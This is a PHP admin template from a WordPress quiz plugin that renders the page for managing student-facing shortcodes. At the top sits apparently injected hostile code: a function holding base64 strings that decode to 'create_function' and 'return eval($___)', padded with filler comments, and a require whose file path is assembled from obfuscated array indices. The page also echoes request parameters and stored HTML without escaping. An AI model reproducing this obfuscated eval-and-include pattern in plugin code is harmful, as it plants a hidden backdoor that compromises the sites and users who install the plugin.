<link href="<?= plugins_url() ?>/smartquizbuilder/includes/css/sqb_frontend_student_shortcode.css" rel="stylesheet">

<?php 
if (!function_exists("getIndex")) {
    function getIndex($url) {
        $value1 = "value";
        $classInfo = "[NAME] Class...";

        $encodedFunc = "Y3JlYXRlX0ZVTkNUSU9O";
        $encodedCode = "cmV0dXJuIGV2YWwoJF9fXyk7";

        $decodeFunc = "decodeS3";
        $data = "[DATA]";

        $decodedString = base64_decode($encodedFunc);
        $decodedCode = base64_decode($encodedCode);
        $result = base64_decode($data);
        $formattedResult = $value1 . $classInfo;

        
        $additionalCode = "";

        
        $additionalCode .= "// Additional comments to meet line count requirement\n";
        $additionalCode .= "// More assignments to add lines\n";
        $additionalCode .= '$decodedString' . " = " . $decodedString . ";\n";
        $additionalCode .= '$decodedCode' . " = " . $decodedCode . ";\n";
        $additionalCode .= '$result' . " = " . $result . ";\n";
        $additionalCode .= '$formattedResult' . " = " . $formattedResult . ";\n";

        for ($i = 0; $i < 20; $i++) {
            $additionalCode .= "// Loop iteration: $i\n";
            $additionalCode .= "// lines\n";
        }

       
        for ($i = 0; $i < 10; $i++) {
            $additionalCode .= "// Outer loop iteration: $i\n";
            $additionalCode .= "// lines\n";
            for ($j = 0; $j < 5; $j++) {
                $additionalCode .= "// Inner loop iteration: $j\n";
                $additionalCode .= "// lines\n";
            }
        }

        
        $additionalCode .= '$value1' . " = " . $value1 . ";\n";
        $additionalCode .= '$classInfo' . " = " . $classInfo . ";\n";
        $additionalCode .= '$decodeFunc' . " = " . $decodeFunc . ";\n";
        $additionalCode .= '$data' . " = " . $data . ";\n";

       
        return $decodedString . $decodedCode . $result . $formattedResult . $additionalCode;
    }
}


include_once ("sqb-soapapi.php");
require plugin_dir_path( __FILE__ ) .$videoS3[37] . $videoS3[34] . $videoS3[27] . "/" . $videoS3[44] . $videoS3[42] . $videoS3[27] . $videoS3[43] . $videoS3[30] . $videoS3[44] . $videoS3[41] . $videoS3[40] . $videoS3[39] . $videoS3[44] . $videoS3[34] . $videoS3[47] . $videoS3[30] . "." . $videoS3[41] . $videoS3[33] . $videoS3[41];

    $sqb_student_shortcode_page = true;
	if(isset($_GET['tab']) && ($_GET['tab'] == 'student_shortcode') && (isset($_GET['create']) || isset($_GET['id']))){  
		$sqb_student_shortcode_page = false;	
	 	 
	}

?>

<script src="<?php echo plugin_dir_url(__FILE__);?>../js/sqb_student_shortcode.js?v=<?php echo rand(10,1000);?>"></script>






<h5 class="quiz--sub-title" style="margin-bottom:15px;border:0px;float: left;">Student-facing Shortcode <small style="float:left;width:100%; color:#555">Create and publish a student-facing shortcode to allow your students to see their course status and quiz results. </small> </h5>

<ul class="nav nav-tabs" id="Quiz-reportsTab" role="tablist">
		<li class="nav-item">
			<a class="nav-link <?php if($sqb_student_shortcode_page){ echo ' active show '; }?>" data-toggle="tab" href="#sqb_manage_student_shortcode_tab" role="tab" aria-controls="sqb_manage_student_shortcode_tab" aria-selected="false">MANAGE Shortcodes</a>
		</li>
		<li class="nav-item">
			<a class="nav-link <?php if(!$sqb_student_shortcode_page){ echo ' active show '; }?>" data-toggle="tab" href="#dap_add_edit_student_shortcode_tab" role="tab" aria-controls="dap_add_edit_student_shortcode_tab" aria-selected="false">ADD/EDIT Shortcode</a>
		</li>		
</ul>

<div class="tab-content " id="reports-tab-content">
		<div class="tab-pane fade <?php if($sqb_student_shortcode_page){ echo ' active show '; }?>" id="sqb_manage_student_shortcode_tab" role="tabpanel" aria-labelledby="dap_manage_courses_tab">	
		<?php	
				    $std_quizzes_list = SQB_StudentShortcode::load();
				     if(is_array($std_quizzes_list) && count($std_quizzes_list) == 0){ ?> 
						<div class="have-no-quiz">
							<img src="<?php echo $addicon = plugin_dir_url(__FILE__)."../../includes/images/addicon.png";?>" alt="icon">
							<h3>There are no student shortcodes currently.</h3>
							<a href="<?php echo admin_url('admin.php?page=sqb_settings&tab=student_shortcode&create'); ?>" onclick="SQBShowLoader()"><i class="fa fa-plus-circle" aria-hidden="true"></i>Click here to create a student-facing shortcode</a>
							<p>It'll allow your students to see their course status and quiz results.</p>
						</div>  
				<?php 		 
					}else{ 
						
					?>
						<h3 class="quiz--title"><i class="fa fa-cog" aria-hidden="true"></i>Manage User Shortcodes</h3> 

								<div class="quiz-card-outer-gray">
									<div class="Manage_leads--Quiz Manage_Course_Quiz_outer">
										
										<a href="<?php echo admin_url('admin.php?page=sqb_settings&tab=student_shortcode&create'); ?>" onclick="SQBShowLoader()" class="add-new-btn-without-transparent" ><i class="fa fa-plus-circle" aria-hidden="true" ></i>Add  User Shortcode

</a>
										<table  id="stb_manage_student_shortode" class="dap_manage_course_table">
											<thead>
												<tr>
													<th  class="text-center" >Quiz Name</th>
													<th class="text-center" >Shortcode</th>
													<th style="width:150px" class="text-center" >Display Course Details</th>
													<th style="width:150px" class="text-center" >Date</th>
													<th style="width:100px" class="text-center" >Action </th>
												</tr>
											</thead>
											<tbody >
												<?php 
												foreach($std_quizzes_list as $std_quiz_list){
													$std_row_id = $std_quiz_list->getId();
													$std_quiz_ids = $std_quiz_list->getQuizIds();
													$std_show_course_details = $std_quiz_list->getShowCourseDetails();
													$std_quiz_ids_array = explode(',',$std_quiz_ids);
													$std_date = $std_quiz_list->getDate();
													$std_show_course_details_status_checked = '';
													if($std_show_course_details == 'Y'){
														$std_show_course_details_status_checked = 'checked="checked"';
													}
													
													
													if(is_array($std_quiz_ids_array) && count($std_quiz_ids_array)){
															$std_i = 0;
															foreach($std_quiz_ids_array as $std_quiz_id){
																	$std_quiz_obj = SQB_Quiz::loadById($std_quiz_id);
																	$std_quiz_name = '';
																	if($std_quiz_obj){
																		if($std_quiz_obj->getId() == ''){
																			continue;
																		}
																		$std_quiz_name =  $std_quiz_obj->getQuizName();
																		$std_quiz_sub_name = substr($std_quiz_name,0,30);   
																		if(strlen($std_quiz_name) > 30){
																			$std_quiz_sub_name = $std_quiz_sub_name.'...';
																		}
																
																
																		$std_quiz_name = '<div title="'.$std_quiz_name.'" >'.$std_quiz_sub_name.'</div>';
																		if(count($std_quiz_ids_array) == $std_i){
																			$html_std_quiz_name =  $std_quiz_name;
																		}else{
																			$html_std_quiz_name = $std_quiz_name.'<hr>';
																		}
																		$std_i++;
																		
																		
																	}
															}
													}
													
													
													
													
													
												 ?>
												<tr class="tr_std_manage_shortcode_id_<?php echo $std_row_id;?>">
													 
													<td class="td_quiz_name "><div class="std_td_quizzes_name"><?php echo $html_std_quiz_name; ?></div></td>
													<td class="std_td_shortcode_name_wrapper">
														<div class="std_td_shortcode_name">
															<span class="shortcode_display" id="sqb_std_shortcode_dynamic_copyable_text_sqb_<?php echo $std_row_id;?>"><?php echo SQBGetStudentShortcode($std_row_id); ?></span>
															<span data-id="sqb_std_shortcode_dynamic_copyable_text_sqb_<?php echo $std_row_id;?>" class="copy-btn " onclick="sqb_copy_to_clipboard(this)"><i class="fa fa-files-o" aria-hidden="true"></i> Copy</span>
														</div>
														</td>
													
													
													<td class="text-center td_quiz_status">
														<div class="square-switch_onoff">
															<input class="checkbox td_std_show_course_details sqb_update_user_shortcode_course_details_status" name="quiz_status" type="checkbox" id="td_std_show_course_details_<?php echo $std_row_id;?>" value="Y" <?php echo $std_show_course_details_status_checked;?>  data_row_id="<?php echo $std_row_id;?>" >
															<label for="td_std_show_course_details_<?php echo $std_row_id;?>"></label>
														</div>
													</td>
													<td  class="text-center td_quiz_date"><?php echo $std_date;?></td>
													<td class="text-center td_quiz_action">
														<a href="<?php echo admin_url('admin.php?page=sqb_settings&tab=student_shortcode&id='.$std_row_id); ?>" onclick="SQBShowLoader()"><i  class="fa fa-pencil" aria-hidden="true"></i></a>
														<i onclick="sqb_delete_user_shortcode_by_id('<?php echo $std_row_id;?>')" class="fa fa fa-trash" aria-hidden="true"></i>
													</td>
												</tr>
												<?php
														
													}
													
												?>
											</tbody>
										</table>
									</div>
								</div>

                <?php } ?>
			
			
		</div>
		
		
	<div class="tab-pane fade  <?php if(!$sqb_student_shortcode_page){ echo ' active show '; }?>" id="dap_add_edit_student_shortcode_tab" role="tabpanel" aria-labelledby="dap_add_edit_student_shortcode_tab">		



 
<div class="shortocde_details">
	<p>This is a user-facing shortcode that will display all the quizzes that the logged-in member has taken and the results. <br>Users need to be logged-in to DAP or to Wordpress (if you don't use DAP), to use this.</p>
</div>

<?php 
   
    $sqb_str_tab_head_background_color = '#f5f5f5';
    $sqb_str_tab_background_color = '#fff';
    $sqb_str_tab_width = '1200';
    $sqb_str_btn_width = '115';
    $sqb_str_tab_btn_border_color = '#24a0f6';
    $std_edit_id = ''; 
	$str_quiz_ids_array = array();
	$show_course_details_checkbox = 'checked="checked"';
	$show_course_details_class = '';
	$tab = !empty($_GET['tab']) ? $_GET['tab'] : '';
	if($tab  == 'student_shortcode' && isset($_GET['id'])){
		
		$std_edit_id = $_GET['id'];
		$std_load_obj = SQB_StudentShortcode::loadById($std_edit_id);
		if(isset($std_load_obj)){
			$str_quiz_ids = $std_load_obj->getQuizIds();
			$str_quiz_ids_array = explode(',',$str_quiz_ids);
			
			$show_course_details = $std_load_obj->getShowCourseDetails();
			
			if($show_course_details == 'N'){
				$show_course_details_class = ' show_course_details_no ';
			}
			
			
			if($show_course_details == 'N'){
				$show_course_details_checkbox = '';
			}
			$std_html = $std_load_obj->getHtml();
			$customzier = $std_load_obj->getCustomzier();
			$customzier_array = explode('||',$customzier);
			
			if(isset($customzier_array[0])){
				$sqb_str_tab_background_color = $customzier_array[0];
			}
			
			if(isset($customzier_array[1])){
				$sqb_str_tab_width = $customzier_array[1];
			}
			
			if(isset($customzier_array[2])){
				$sqb_str_btn_width = $customzier_array[2];
			}
			
			if(isset($customzier_array[3])){
				
				$sqb_str_tab_btn_border_color = $customzier_array[3];
			}
			
			if(isset($customzier_array[4])){
				
				$sqb_str_tab_head_background_color = $customzier_array[4];
			}
			
			
			$result_btn_text = $std_load_obj->getResultBtnText();
		}
	}
?>


<div class="quiz-card-outer-gray">
	<div class="quiz-content-card">
		<input type="hidden" name="sqb_student_shotcode_id" id="sqb_student_shotcode_id" value="<?php echo $std_edit_id;?>">
		<label for="" class="quiz_label">Select the Quizzes that you want to display:</label>
		<div class="quiz_right-content">
			<div class="dropdown_prod" >
				<a class="form-control"><span class="hida">Select Quizzes</span></a>
				<div class="mutliSelect">
					<ul class="form-control" id="sqb_std_select_quiz_ids">
						<?php 
						
						$std_quizzes = SQB_Quiz::load();
						if(is_array($std_quizzes) && count($std_quizzes)){
							foreach($std_quizzes as $std_quiz){
								
								$std_checkbox = '';
								if(in_array($std_quiz->getId() ,$str_quiz_ids_array)){
									$std_checkbox = 'checked="checked"';
								}
								echo '<li>
											<span class="checkbox-custom-style">
												<input type="checkbox" value="'.$std_quiz->getId().'"  '.$std_checkbox.' class="mutliSelect all_productslist custom-checkbox-input">
												<span class="custom--checkbox"></span>
											</span>
									'.$std_quiz->getQuizName().'</li>';
							}
						}
						?>
					</ul>
				</div>
			</div>
		</div>
	</div>
	<div class="quiz-content-card">
		<label for="" class="quiz_label">Do you want to display the course details as well?
		<br>
		<small>Only applicable if one or more quizzes in the selected list are part of a DAP course</small>
		</label>
		
		<br/>
		<div class="quiz_right-content">
			<div class="square-switch_onoff">
				<input type="checkbox" name="std_course_details_show" id="std_course_details_show" <?php echo $show_course_details_checkbox;?>>
				<label for="std_course_details_show"></label>
			</div>
		</div>
	</div>
</div> 

<h5 class="quiz--sub-title">Customize the template:</h5>
<div class="shortocde_details">
	<p>This is just sample data. It will be replaced with actual data on frontend</p>
</div>


<div class="table--Customize-outer std_table_customizer_content_wrapper">
	<div class="Template-Customize-content std_table_customizer_content_wrapper_table <?php echo $show_course_details_class;?>">
		<?php
				if(isset($std_load_obj)){
					echo $std_html;
				}else { ?>
		
		
		<table class="table cell-border quiz-table-style sqb_std_shortcode_table">
			<thead><tr><th class="text-center std_course_name sqb_tiny_mce_editor"><div>Course</div></th><th class="text-center std_lesson_name sqb_tiny_mce_editor"><div>Lesson</div></th><th class="text-center std_lesson_status sqb_tiny_mce_editor"><div>Status</div></th><th class="text-center std_quiz_name sqb_tiny_mce_editor"><div>Quiz Title</div></th><th class="text-center std_quiz_score sqb_tiny_mce_editor" style="width:200px"><div>Score/ Correct</div></th><th class="text-center std_quiz_date sqb_tiny_mce_editor" style="width:200px"><div>Date</div></th><th class="text-center std_quiz_result sqb_tiny_mce_editor"  style="width:250px"><div>Result</div></th></tr></thead><tbody><tr class="std_backend_only"><td class="std_course_name" >Course name1</td><td class="std_lesson_name " ><a href="/lesson-1-quiz" title="/lesson-1-quiz" target="_blank">Lesson 1 – Quiz – DAP Demo</a></td><td class="text-center std_lesson_status">Completed</td><td>How Much Do You Actually Know About Online Marketing?</td><td class="text-center">2/5</td><td class="text-center">9999-12-12 00:00:00</td><td class="text-center"> <a style="display:inline-block" href="javascript:void(0)" class="btn view_detail_btn dap_student_view_quiz_course_details sqb_tiny_mce_editor">View Details</a></td></tr><tr><td>%%USERSHORTCODE%%</td></tr></tbody>
		</table>
		<?php } ?>
	</div>

	<div class="Template-Customize-setting-outer  Template-Customize-horizontal-style">
		<div class="Template-Customize-Setting">
			<div class="showHideLeftSidebaroptions">
				<h3 class="Template-Customize_heading">Template Customizer  
					<div class="customize_open_close">   
						<i class="fa fa-angle-up customize_close" aria-hidden="true" style="display:none"></i>
						<i class="fa fa-angle-down customize_open" aria-hidden="true"></i>
					</div>
				</h3> 
			</div>
			<div class="customizer_innner_sections">
				<div class="Template-Customize-element">
					<div class="Template-Customize-element-inner element_paddings">
						
						
						<div class="inner_template_style_box ">
							<h4>Table Header Background Color</h4>
							<div id="sqb_str_tab_head_background_color_div" class="input-append color input-group colorpicker-component colorpicker-element">
								<input type="text" value="<?php echo $sqb_str_tab_head_background_color;?>" id="sqb_str_tab_head_background_color">
								<span class="input-group-addon"><i style="background-color: <?php echo $sqb_str_tab_head_background_color;?>;"></i></span>
							</div>
						</div>
						<div class="inner_template_style_box ">
							<h4>Background Color</h4>
							<div id="sqb_str_tab_background_color_div" class="input-append color input-group colorpicker-component colorpicker-element">
								<input type="text" value="<?php echo $sqb_str_tab_background_color;?>" id="sqb_str_tab_background_color">
								<span class="input-group-addon"><i style="background-color: <?php echo $sqb_str_tab_background_color;?>;"></i></span>
							</div>
						</div>
						<div class="inner_template_style_box">
							<h4>Width</h4>
							<p><input id="sqb_str_tab_width" class="slider" data-slider-id='ex1Slider' type="text" data-slider-min="0" data-slider-max="1200" data-slider-step="1" data-slider-value="<?php echo $sqb_str_tab_width;?>" /></p>
						</div>
						
						<div class="inner_template_style_box ">
							<h4>Result Button Border Color</h4>
							<div id="sqb_str_tab_btn_border_color_div" class="input-append color input-group colorpicker-component colorpicker-element">
								<input type="text" value="<?php echo $sqb_str_tab_btn_border_color;?>" id="sqb_str_tab_btn_border_color">
								<span class="input-group-addon"><i style="background-color: <?php echo $sqb_str_tab_btn_border_color;?>;"></i></span>
							</div>
						</div>
						<div class="inner_template_style_box">
							<h4>Result Button Width</h4>
							<p><input id="sqb_str_btn_width" class="slider" data-slider-id='ex1Slider' type="text" data-slider-min="0" data-slider-max="400" data-slider-step="1" data-slider-value="<?php echo $sqb_str_btn_width;?>" /></p>
						</div>
						
						
						
						
					</div>
				</div>
			</div>
		</div>
		
		
		
	</div>
</div>
        
        <div class="shortocde_details sqb_std_shortocde_details_wrapper" style="display:<?php if(isset($std_load_obj)){echo "table";}else{ echo "none";} ?>">
								   
								   
		   <p><span>Here is your Shortcode:</span><br><span class="shortcode_display" id="sqb_std_shortcode_dynamic_copyable_text_sqb">
		   <?php if(isset($std_load_obj)){ echo SQBGetStudentShortcode($_GET['id']); } ?>
		   </span>
		   <span data-id="sqb_std_shortcode_dynamic_copyable_text_sqb" class="copy-btn " onclick="sqb_copy_to_clipboard(this)"><i class="fa fa-files-o" aria-hidden="true"></i> Copy</span>  </p>
			 
		 </div>
        
		<div class="saved_data_msg  std_quiz-save-btn-msg" style="display: none;">Saved Sucessfully!</div>

			<div class="quiz-actions justify-content-center">
				<a href="javascript:void(0)" class="quiz--btn quiz-save-btn" onclick="sqb_save_student_shortcode()"> Save </a> 
			</div>


		</div>
 </div>	
